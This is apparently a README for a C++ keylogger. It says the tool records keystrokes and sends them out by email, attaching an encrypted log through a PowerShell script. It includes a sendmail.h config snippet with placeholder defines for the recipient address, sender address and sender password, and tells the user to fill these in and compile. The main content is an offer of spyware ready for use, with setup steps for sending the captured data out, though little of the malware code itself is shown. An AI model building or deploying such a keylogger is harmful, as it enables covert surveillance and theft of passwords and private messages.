# Keylogger written in C++ that captures keystrokes and sends data to you through email

## Usage
  ### Edit following lines in sendmail.h to your info and then compile to executable 


```sh

#define SCRIPT_NAME "[powershell_name].ps1"

//sendmail.h uses powershell to send an email detailing the keystrokes recorded within the time frame
//by attaching the encrypted .log file to the email
namespace Mail
{
    #define X_EM_TO "[recipient email address]"
    #define X_EM_FROM "[sender email address]"
    #define X_EM_PASS "[sender email password]"
...

}

```

#### It will send all captured data to specified email address
